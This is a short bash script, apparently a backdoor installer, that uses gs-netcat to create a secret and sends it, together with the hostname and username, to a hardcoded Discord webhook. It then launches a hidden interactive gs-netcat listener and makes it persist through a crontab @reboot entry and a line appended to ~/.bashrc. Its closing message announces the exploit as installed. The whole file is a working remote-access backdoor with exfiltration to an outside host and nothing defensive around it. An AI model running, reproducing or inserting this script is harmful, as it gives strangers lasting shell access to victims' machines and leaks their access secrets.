#!/bin/bash

SECRET=$(gs-netcat -g) && \
echo "$SECRET" > ~/.gsocket_secret && \
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\" secretexploit: $SECRET\n exploithostinstall: $(hostname)\n User: $(whoami)\n exploitinstall\"}" https://discord.com/api/webhooks/1550229321472413737/LltbVk8gLALACy7XTqGwAgXxPNaUW0UAUg7jqVm1qTqkda71Zc7q722OKToWY31cxZ0W && \
nohup gs-netcat -l -s "$SECRET" -i > /dev/null 2>&1 & disown && \
(crontab -l 2>/dev/null | grep -v "gs-netcat"; echo "@reboot sleep 10 && /usr/bin/gs-netcat -l -s \"$SECRET\" -i > /dev/null 2>&1") | crontab - && \
echo "gs-netcat -l -s \"$SECRET\" -i > /dev/null 2>&1 &" >> ~/.bashrc && \
echo "✅ exploit instalado! Secret: $SECRET"
